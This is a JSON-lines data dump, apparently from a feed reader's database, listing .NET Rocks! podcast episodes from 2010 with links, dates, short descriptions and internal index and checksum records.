{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=575","title":"Steven Sanderson on MVVM, Knockout, and HTML 5","published":{"$wrap":"$date","v":1278993600000,"h":"2010-07-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Steven Sanderson from the UK talks about Knockout, his open source library for doing databinding with Javascript using the MVVM pattern. The conversation goes from that to MVVM to HTML 5 and beyond.","author":false,"_id":{"$wrap":"$oid","v":317}}
{"k":"0000000082","o":"0000000468","v":"001"}
{"_id":318,"_uid":318,"_dt":1373728933970,"_s":"ee7a114f851576930f9385d6d6a1eadb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=574","title":"Catching up with Mary Jo Foley","published":{"$wrap":"$date","v":1278561600000,"h":"2010-07-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Mary Jo Foley treks up to Pwop Studios to talk to Carl and Richard during  the .NET Rocks! Live Weekend. She's really smitten with the iPad. Hmmmm... what else?","author":false,"_id":{"$wrap":"$oid","v":318}}
{"k":"0000000082","o":"0000000715","v":"001"}
{"_id":319,"_uid":319,"_dt":1373728933971,"_s":"ce05af8b199e1912b601ceba3eac90ea"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=573","title":"A Chat with James Kovacs","published":{"$wrap":"$date","v":1278388800000,"h":"2010-07-06T04:00:00.000Z"},"starred":false,"read":false,"content":"As Carl and Richard hang out in their comfy chairs broadcasting to your cell phone, James Kovacs talks briefly about psake, his Powershell-based build tool then goes on to talk about XML readability, designing XAML graphically, JQuery, the functionalness of Javascript, and the potential success of HTML 5. This show was recorded live during the .NET Rocks! Live Weekend. See the links below for more information.","author":false,"_id":{"$wrap":"$oid","v":319}}
{"k":"0000000082","o":"0000000469","v":"001"}
{"_id":320,"_uid":320,"_dt":1373728933972,"_s":"fcd1807aa64e8a62c2a2867dc7ee5a12"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=572","title":"Clemens Vasters on Service Bus","published":{"$wrap":"$date","v":1277956800000,"h":"2010-07-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Clemens Vasters catches up with Carl and Richard at the Norwegian Developer's Conference to talk about the Service Bus, which Clemens is working on at Microsoft.","author":false,"_id":{"$wrap":"$oid","v":320}}
{"k":"0000000082","o":"0000000417","v":"001"}
{"_id":321,"_uid":321,"_dt":1373728933972,"_s":"60a2fbb1f3d336b18861e74a2be8148d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=571","title":"Daniel Simmons on EF4","published":{"$wrap":"$date","v":1277784000000,"h":"2010-06-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Daniel Simmons from Microsoft joins Carl and Richard on the DNR Live Weekend for an hour of Entity Framework goodness.","author":false,"_id":{"$wrap":"$oid","v":321}}
{"k":"0000000082","o":"0000000449","v":"001"}
{"_id":322,"_uid":322,"_dt":1373728933973,"_s":"0c6729279b6134bfe5829709a98ee6bd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=570","title":"Kevin Hazzard on Code Contracts","published":{"$wrap":"$date","v":1277352000000,"h":"2010-06-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Kevin Hazzard talks about Code Contracts, which grew out of Spec# and now exists in the .NET Framework 4.0. He also gives us his take on F#.","author":false,"_id":{"$wrap":"$oid","v":322}}
{"k":"0000000082","o":"0000000642","v":"001"}
{"_id":323,"_uid":323,"_dt":1373728933974,"_s":"e699f472aa5598233940deeaa4c2a831"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=569","title":".NET in your Car!","published":{"$wrap":"$date","v":1277179200000,"h":"2010-06-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Stacy Harris and John Mulinax from Microsoft, and TJ Giuli from Ford Motor Company about Fiestaware. No, not the plates your mother serves nachos on. Fiestaware is a framework developed by students for developing in-car applications that do everything from read your emails to seeing your buddies' locations on a bing map.","author":false,"_id":{"$wrap":"$oid","v":323}}
{"k":"0000000082","o":"0000000488","v":"001"}
{"_id":324,"_uid":324,"_dt":1373728933975,"_s":"041b2159fbe634ab94baf6846334990e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=568","title":"Jackson Harper and Chris Hardy on Mono","published":{"$wrap":"$date","v":1276747200000,"h":"2010-06-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Jackson Harper from the Mono team and Chris Hardy, an ASPInsider talk to Carl and Richard about the state of Mono, Moonlight, and Monotouch, which Chris swears is not dead.","author":false,"_id":{"$wrap":"$oid","v":324}}
{"k":"0000000082","o":"0000000448","v":"001"}
{"_id":325,"_uid":325,"_dt":1373728933976,"_s":"c466706efbf4d924441126633f0839c6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=567","title":"Jon von Gillern Analyzes Code with Nitriq","published":{"$wrap":"$date","v":1276574400000,"h":"2010-06-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Jon von Gillern talks about his passion for coding, which has culminated in two unique code analysis products: Nitriq and Atomiq.","author":false,"_id":{"$wrap":"$oid","v":325}}
{"k":"0000000082","o":"0000000592","v":"001"}
{"_id":326,"_uid":326,"_dt":1373728933976,"_s":"cef009fb6a782440070bac24b99cea11"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=566","title":"Microsoft Townhall","published":{"$wrap":"$date","v":1276142400000,"h":"2010-06-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Nick Schaper and Marc Mercuri talk about building America Speaking Out, a website where citizens can vote on political issues. ASO uses the Microsoft TownHall platform, a low-cost framework built on Azure and used by campaigns to build websites to help them keep in touch with their constituency.","author":false,"_id":{"$wrap":"$oid","v":326}}
{"k":"0000000082","o":"0000000407","v":"001"}
{"_id":327,"_uid":327,"_dt":1373728933977,"_s":"a05ca6aea6c625e17cec3ea0bbe42c47"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=565","title":"Steve Evans Compares Amazon and Azure","published":{"$wrap":"$date","v":1275969600000,"h":"2010-06-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Steve Evans is back! This time he's comparing cloud offerings from Amazon and Windows Azure.","author":false,"_id":{"$wrap":"$oid","v":327}}
{"k":"0000000082","o":"0000000537","v":"001"}
{"_id":328,"_uid":328,"_dt":1373728933978,"_s":"6538a8b6957aaf8f7b2d7f2247af0b57"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=564","title":"Rene Schulte on Augmented Reality in SL4","published":{"$wrap":"$date","v":1275537600000,"h":"2010-06-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Rene Schulte talks about his work in Silverlight 4 with Augmented Reality. He's created an Augmented Reality Toolkit for Silverlight 4 that utilizes the webcam and adds graphics to the video that hold their perspective.","author":false,"_id":{"$wrap":"$oid","v":328}}
{"k":"0000000082","o":"0000000580","v":"001"}
{"_id":329,"_uid":329,"_dt":1373728933978,"_s":"c16eaf817faa5d920f5d4064244cc9eb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=563","title":"Steve Milroy Tracks the Roadtrip with Bing Maps and Silverlight 4","published":{"$wrap":"$date","v":1275364800000,"h":"2010-06-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Steve Milroy talks about the Silverlight 4 application his company, Onterra Systems, developed to track the DotNetMobile in real time as Carl and Richard drove across Ameria on the .NET Rocks! Visual Studio 2010 Road Trip in April, 2010.","author":false,"_id":{"$wrap":"$oid","v":329}}
{"k":"0000000082","o":"0000000430","v":"001"}
{"_id":330,"_uid":330,"_dt":1373728933979,"_s":"ac20d83a1c3f6bf058def44ac57d7ac3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=562","title":"Teaching Kids Programming","published":{"$wrap":"$date","v":1274932800000,"h":"2010-05-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Llewellyn Falco and Lynn Langit talk about their free curriculum for teaching kids programming, involving Microsoft SmallBasic.","author":false,"_id":{"$wrap":"$oid","v":330}}
{"k":"0000000082","o":"0000000405","v":"001"}
{"_id":331,"_uid":331,"_dt":1373728933980,"_s":"5c1eaeca10c5b903550f0178a31b8d77"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=561","title":"David Miller on Clojure","published":{"$wrap":"$date","v":1274760000000,"h":"2010-05-25T04:00:00.000Z"},"starred":false,"read":false,"content":"David Miller talks to Carl and Richard about Clojure-CLR, a .NET implementation of the Clojure language.","author":false,"_id":{"$wrap":"$oid","v":331}}
{"k":"0000000082","o":"0000000550","v":"001"}
{"_id":332,"_uid":332,"_dt":1373728933981,"_s":"92d20c1994b53ba38456374d2eb9b5fb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=560","title":"F# Panel Live from NERD Center, Cambridge, MA","published":{"$wrap":"$date","v":1274328000000,"h":"2010-05-20T04:00:00.000Z"},"starred":false,"read":false,"content":"While on the Road Trip, Carl and Richard recorded this panel discussion with Talbott Crowell, Rick Minerich and Richard Hale Shaw on F#. The panel makes a very compelling case for adding a functional language to your toolchest.","author":false,"_id":{"$wrap":"$oid","v":332}}
{"k":"0000000082","o":"0000000537","v":"001"}
{"_id":333,"_uid":333,"_dt":1373728933981,"_s":"4a00631b261a87b07d3b77b89f6b485e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=559","title":"Brandon Watson Live in Atlanta","published":{"$wrap":"$date","v":1274155200000,"h":"2010-05-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Brandon Watson from the Windows Phone 7 team tells Carl and Richard how his job is to delight developers, and he's doing just that! Windows Phone 7 represents a veritable gold rush for developers this year, next year, and beyond.","author":false,"_id":{"$wrap":"$oid","v":333}}
{"k":"0000000082","o":"0000000534","v":"001"}
{"_id":334,"_uid":334,"_dt":1373728933982,"_s":"b33d9c155acb6d382d2049ed2398dd2f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=558","title":"Matthew Podwysocki Codes the Reactive Framework","published":{"$wrap":"$date","v":1273723200000,"h":"2010-05-13T04:00:00.000Z"},"starred":false,"read":false,"content":"We know, this was supposed to be that Atlanta road trip show. Turns out that show is on an SD card en route to New London. Meantime, enjoy this great show with Matthew Podwysocki about the Reactive Extentions.","author":false,"_id":{"$wrap":"$oid","v":334}}
{"k":"0000000082","o":"0000000485","v":"001"}
{"_id":335,"_uid":335,"_dt":1373728933986,"_s":"1cea616714b0b6c559a294c3f81565c3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=557","title":"PhoneGap with Jesse MacFadyen and Filip Maj","published":{"$wrap":"$date","v":1273550400000,"h":"2010-05-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Jesse MacFadyen and Filip Maj talk to Carl and Richard about PhoneGap, an open source project for supporting rich applications on a large variety of mobile devices.","author":false,"_id":{"$wrap":"$oid","v":335}}
{"k":"0000000082","o":"0000000496","v":"001"}
{"_id":336,"_uid":336,"_dt":1373728933986,"_s":"1ec4901ea92fb90989162aaa11abf3b5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=556","title":"Brian Harry Live in Durham, NC","published":{"$wrap":"$date","v":1273204800000,"h":"2010-05-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Brian Harry talks about his experiences at Microsoft on the Visual Source Safe team and the TFS team, and his favorite new ALM (Application Lifecycle Management) features of Visual Studio.","author":false,"_id":{"$wrap":"$oid","v":336}}
{"k":"0000000082","o":"0000000574","v":"001"}
{"_id":337,"_uid":337,"_dt":1373728933987,"_s":"415155e1e7cea229287a50bdf050746d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=555","title":"Mark Miller and Karen Mangiacotti Live in Richmond, VA","published":{"$wrap":"$date","v":1273118400000,"h":"2010-05-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark and Karen talk with Carl and Richard about inspiring kids to greatness and fostering wonder in them. As well, Mark reflects on some of the more fun projects he's worked on, and answers the question... where does the mad genius come from?","author":false,"_id":{"$wrap":"$oid","v":337}}
{"k":"0000000082","o":"0000000549","v":"001"}
{"_id":338,"_uid":338,"_dt":1373728933988,"_s":"89b8afe0d9d78495f30c5002c7e1e4b5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=554","title":"Ivar Jacobson Live in New York City","published":{"$wrap":"$date","v":1273032000000,"h":"2010-05-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Ivar Jacobson comes back to .NET Rocks, this time as a special guest on the Road Trip. He talks about Microsoft's re-embrace of UML, his work on Software Engineering Method And Theory (SEMAT), and tells a few Bill Gates stories as well.","author":false,"_id":{"$wrap":"$oid","v":338}}
{"k":"0000000082","o":"0000000521","v":"001"}
{"_id":339,"_uid":339,"_dt":1373728933988,"_s":"cf93a11fdbd1977269cda6787fe3a194"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=553","title":"Chris Sells Live in Boston","published":{"$wrap":"$date","v":1272945600000,"h":"2010-05-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Chris Sells joins Carl and Richard on the Road Trip at Microsoft in Cambridge, Massachusetts. Chris is working on guidance for when to use what Microsoft Technologies in the data stack: OData, EF, RIA Services, et al.","author":false,"_id":{"$wrap":"$oid","v":339}}
{"k":"0000000082","o":"0000000471","v":"001"}
{"_id":340,"_uid":340,"_dt":1373728933989,"_s":"fd84a39ee9eeb7bf865576d003bc4570"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=552","title":"Rocky Lhotka and Jay Schmelzer Live in Chicago","published":{"$wrap":"$date","v":1272859200000,"h":"2010-05-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Rocky and Jay talk with Carl and Richard about the Visual Studio designer experience: XAML vs Cider, as well as ruminations on Silverlight and WPF.","author":false,"_id":{"$wrap":"$oid","v":340}}
{"k":"0000000082","o":"0000000473","v":"001"}
{"_id":341,"_uid":341,"_dt":1373728933990,"_s":"088a01c75b384891371a9dd30bb18526"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=551","title":"Kate Gregory Live in St. Louis, MO","published":{"$wrap":"$date","v":1272600000000,"h":"2010-04-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Kate Gregory talks about programming for Windows 7. As well, we have a discussion about the lack of real-world preparation in University for software developers.","author":false,"_id":{"$wrap":"$oid","v":341}}
{"k":"0000000082","o":"0000000441","v":"001"}
{"_id":342,"_uid":342,"_dt":1373728933991,"_s":"dacc7db059a79541fce435cd7fc783c7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=550","title":"Tim Huckaby Live in Tulsa","published":{"$wrap":"$date","v":1272513600000,"h":"2010-04-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Tim Huckaby talks about his work with Interknowlogy, cancer research, fly fishing, Windows Phone 7, and the convergence of XAML platforms.","author":false,"_id":{"$wrap":"$oid","v":342}}
{"k":"0000000082","o":"0000000537","v":"001"}
{"_id":343,"_uid":343,"_dt":1373728933992,"_s":"dd0a31c0a1bd68cfef762f34ac4ac435"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=549","title":"Michelle Leroux Bustamante Live in Dallas","published":{"$wrap":"$date","v":1272427200000,"h":"2010-04-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with MLB in Dallas. We find out what she's up to. An interesting question asked: What was the most challenging system you ever had to architect? And yes, of course she tells a joke at the end!","author":false,"_id":{"$wrap":"$oid","v":343}}
{"k":"0000000082","o":"0000000537","v":"001"}
{"_id":344,"_uid":344,"_dt":1373728933992,"_s":"0d61bda2ff32d316c2902a3269d22ac0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=548","title":"Dustin Campbell Live in Houston","published":{"$wrap":"$date","v":1272340800000,"h":"2010-04-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Dustin Campbell from the Visual Studio team about his work in Language UI and Intellisense. He also talks about his experiences with Mark Miller at Developer Express, and shows off his jazz guitar chops.","author":false,"_id":{"$wrap":"$oid","v":344}}
{"k":"0000000082","o":"0000000503","v":"001"}
{"_id":345,"_uid":345,"_dt":1373728933993,"_s":"b79b26f39e8672841f8ded3eeffe7714"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=547","title":"Alan Griver, Beth Massi, and Tim Heuer Live in Phoenix","published":{"$wrap":"$date","v":1272254400000,"h":"2010-04-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Richard and Carl talk to Alan Griver, Beth Massi, and Tim Heuer in front of a live audience on the 5th stop of the .NET Rocks! Visual Studio 2010 Road Trip in Phoenix, AZ.","author":false,"_id":{"$wrap":"$oid","v":345}}
{"k":"0000000082","o":"0000000447","v":"001"}
{"_id":346,"_uid":346,"_dt":1373728933994,"_s":"9f58500382c7a91c07df4b01fbbd4d39"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=546","title":"Scott Stanfield Live in Redlands, CA","published":{"$wrap":"$date","v":1271995200000,"h":"2010-04-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Scott Stanfield about his historical perspective around Visual Studio .NET and how he got into the business.","author":false,"_id":{"$wrap":"$oid","v":346}}
{"k":"0000000082","o":"0000000448","v":"001"}
{"_id":347,"_uid":347,"_dt":1373728933994,"_s":"3cafc770f605de6027a0cb1426dfe42e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=545","title":"Billy Hollis Live in San Diego","published":{"$wrap":"$date","v":1271908800000,"h":"2010-04-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Billy Hollis in San Diego on the third stop of the road trip. Billy always has something interesting to talk about.","author":false,"_id":{"$wrap":"$oid","v":347}}
{"k":"0000000082","o":"0000000453","v":"001"}
{"_id":348,"_uid":348,"_dt":1373728933995,"_s":"54f2db7484b129a726b3d0b76f9b65c0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=544","title":"Dan Fernandez Live in Los Angeles","published":{"$wrap":"$date","v":1271822400000,"h":"2010-04-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Dan Fernandez about Channel 9, online community, Visual Studio Express, and more on the second stop of our Road Trip!","author":false,"_id":{"$wrap":"$oid","v":348}}
{"k":"0000000082","o":"0000000468","v":"001"}
{"_id":349,"_uid":349,"_dt":1373728933995,"_s":"233e215fde88d31c0d420d28aa189aa6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=543","title":"Phil Haack Live in Mountain View, California","published":{"$wrap":"$date","v":1271736000000,"h":"2010-04-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Phil Haack was our guest on the first Road Trip show! We talked about shipping VS2010, ASP.NET MVC, and Phil told us how he got into the business.","author":false,"_id":{"$wrap":"$oid","v":349}}
{"k":"0000000082","o":"0000000419","v":"001"}
{"_id":350,"_uid":350,"_dt":1373728933996,"_s":"9dcbe1f06c9fe6e7eb55addc20a60a96"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=542","title":"Daniel Egan talks Windows Phone 7 Live at Launch","published":{"$wrap":"$date","v":1271304000000,"h":"2010-04-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Daniel Egan about Windows Phone 7, present and (dare we say) future.","author":false,"_id":{"$wrap":"$oid","v":350}}
{"k":"0000000082","o":"0000000460","v":"001"}
{"_id":351,"_uid":351,"_dt":1373728933997,"_s":"0c042ece247ab852bca3c10160f57cf6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=541","title":"Anders Hejlsberg blows our minds!","published":{"$wrap":"$date","v":1271131200000,"h":"2010-04-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Anders Hejlsberg about languages, LINQ internals, high-levels of abstraction, VB, and a few other goodies. Not to be missed!","author":false,"_id":{"$wrap":"$oid","v":351}}
{"k":"0000000082","o":"0000000384","v":"001"}
{"_id":352,"_uid":352,"_dt":1373728933997,"_s":"bfe89acf8bb82ac9db607c850d089cbb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=540","title":"Jim Zimmerman combines Facebook and Azure","published":{"$wrap":"$date","v":1270699200000,"h":"2010-04-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Jim Zimmerman talks about the Windows Azure Toolkit for Facebook.","author":false,"_id":{"$wrap":"$oid","v":352}}
{"k":"0000000082","o":"0000000427","v":"001"}
{"_id":353,"_uid":353,"_dt":1373728933998,"_s":"b63e9a060de5bc9d2a96299278c6f8e2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=539","title":"Charlie Kindel on Windows Phone 7","published":{"$wrap":"$date","v":1270526400000,"h":"2010-04-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Charlie Kindel from Microsoft about building applications for the Windows Phone 7 platform.","author":false,"_id":{"$wrap":"$oid","v":353}}
{"k":"0000000082","o":"0000000463","v":"001"}
{"_id":354,"_uid":354,"_dt":1373728933999,"_s":"a5980b300fa56662783cc1254fbc54d8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=538","title":"Lino Tadros goes Old School on us.","published":{"$wrap":"$date","v":1270094400000,"h":"2010-04-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Lino Tadros of Borland and Falafel Software fame takes us back to when he worked for Anders Hejlsberg at Borland. Good stories from an old-school geek!","author":false,"_id":{"$wrap":"$oid","v":354}}
{"k":"0000000082","o":"0000000487","v":"001"}
{"_id":355,"_uid":355,"_dt":1373728933999,"_s":"d71e5a3e7f476f6aa01d6af3bf18fc2b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=537","title":"Roman Rubin and Venkatesh Ramakrishnan Push the Limits of Silverlight.","published":{"$wrap":"$date","v":1269921600000,"h":"2010-03-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Roman Rubin and Venkatesh (Venky) Ramakrishnan talk about their experiences architecting and building large-scale Silverlight applications.","author":false,"_id":{"$wrap":"$oid","v":355}}
{"k":"0000000082","o":"0000000509","v":"001"}
{"_id":356,"_uid":356,"_dt":1373728934001,"_s":"43516e34e79716a3eadd8978c68411a1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=536","title":"Weyer and Rammer Program iPhones with MonoTouch","published":{"$wrap":"$date","v":1269489600000,"h":"2010-03-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Christian Weyer and Ingo Rammer from Thinktecture talk with Carl and Richard about programming iPhone applications with MonoTouch, an open source iPhone development tool based on Mono.","author":false,"_id":{"$wrap":"$oid","v":356}}
{"k":"0000000082","o":"0000000534","v":"001"}
{"_id":357,"_uid":357,"_dt":1373728934002,"_s":"da2bc5785da606d182d948c9c62bf7d3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=535","title":"Mark Brown Introduces Us to the Web Platform Installer","published":{"$wrap":"$date","v":1269316800000,"h":"2010-03-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Mark Brown talks about the Web Platform Installer, a free tool for developers from Microsoft that will sucessfully install everything your PC needs to develop web applications on the Microsoft platform.","author":false,"_id":{"$wrap":"$oid","v":357}}
{"k":"0000000082","o":"0000000469","v":"001"}
{"_id":358,"_uid":358,"_dt":1373728934002,"_s":"e329080aa97d3d3a9a6e34f854926bcf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=534","title":"Instrumenting Applications with Runtime Intelligence","published":{"$wrap":"$date","v":1268884800000,"h":"2010-03-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Gabriel Torok and Joe Kuemerle about what it takes to really know what's going on in your enterprise in real time.","author":false,"_id":{"$wrap":"$oid","v":358}}
{"k":"0000000082","o":"0000000377","v":"001"}
{"_id":359,"_uid":359,"_dt":1373728934003,"_s":"4a1e364daeeabf58c8b221bfec570e57"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=533","title":"Phil Haack Introduces MVC 2","published":{"$wrap":"$date","v":1268712000000,"h":"2010-03-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Haack is back! This time, to announce ASP.NET Model View Controller v2.0","author":false,"_id":{"$wrap":"$oid","v":359}}
{"k":"0000000082","o":"0000000504","v":"001"}
{"_id":360,"_uid":360,"_dt":1373728934004,"_s":"a1401dbb763dc1017206c53bef7c1ba5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=532","title":"Stories from the Dallas GiveCamp","published":{"$wrap":"$date","v":1268280000000,"h":"2010-03-11T04:00:00.000Z"},"starred":false,"read":false,"content":"What do you get when you cross a hundered or so geeks, mountains of pizza, truckloads of energy drinks, and a mission to help the charities of the world beef up their online offerings? GiveCamp.","author":false,"_id":{"$wrap":"$oid","v":360}}
{"k":"0000000082","o":"0000000566","v":"001"}
{"_id":361,"_uid":361,"_dt":1373728934004,"_s":"02bc99adf6460be57f912aaf2fa5b15c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=531","title":"Toad + .NET = Datadude for Oracle","published":{"$wrap":"$date","v":1268107200000,"h":"2010-03-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Daniel Norwood and Daniel Wood (I know) from Quest Software, makers of Toad - data tools for Oracle. Now providing Toad Extention for Visual Studio .NET, bringing all of the Datadude features of Visual Studio to Oracle developers.","author":false,"_id":{"$wrap":"$oid","v":361}}
{"k":"0000000082","o":"0000000440","v":"001"}
{"_id":362,"_uid":362,"_dt":1373728934005,"_s":"789f718d012923e5ec939b474ff8cd95"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=530","title":"Brad Frazer on Copyright, SLAs and more","published":{"$wrap":"$date","v":1267675200000,"h":"2010-03-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Brad Frazer talks to Carl and Richard about copyright law as it applies to protecting digital media, content, and software.","author":false,"_id":{"$wrap":"$oid","v":362}}
{"k":"0000000082","o":"0000000375","v":"001"}
{"_id":363,"_uid":363,"_dt":1373728934006,"_s":"c512d847006bf36f9eef75196efddd1e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=529","title":"Oren Eini on creating DSLs in Boo","published":{"$wrap":"$date","v":1267502400000,"h":"2010-03-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Oren Eini talks about creating Domain Specific Languages in Boo.","author":false,"_id":{"$wrap":"$oid","v":363}}
{"k":"0000000082","o":"0000000522","v":"001"}
{"_id":364,"_uid":364,"_dt":1373728934007,"_s":"5b218829085bc000f968c84c8a0dbc82"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=528","title":"It's the Visual Studio 2010 Launch Show!","published":{"$wrap":"$date","v":1267070400000,"h":"2010-02-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Dave Mendlen and Sam Gazitt from Microsoft about the launch event April 12-14, 2010 at the Bellagio in Las Vegas where .NET 4.0 and Visual Studio 2010 will be officially launched.","author":false,"_id":{"$wrap":"$oid","v":364}}
{"k":"0000000082","o":"0000000416","v":"001"}
{"_id":365,"_uid":365,"_dt":1373728934007,"_s":"f0e692bd43f11b6233a8d755183c43b9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=527","title":"Joel Semeniuk on using TFS with small teams","published":{"$wrap":"$date","v":1266897600000,"h":"2010-02-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Joel is back to talk about how small development teams can best utilize Team Foundation Server.","author":false,"_id":{"$wrap":"$oid","v":365}}
{"k":"0000000082","o":"0000000584","v":"001"}
{"_id":366,"_uid":366,"_dt":1373728934008,"_s":"7ef2d3fadbf853d4aea694cfb0d239c4"}
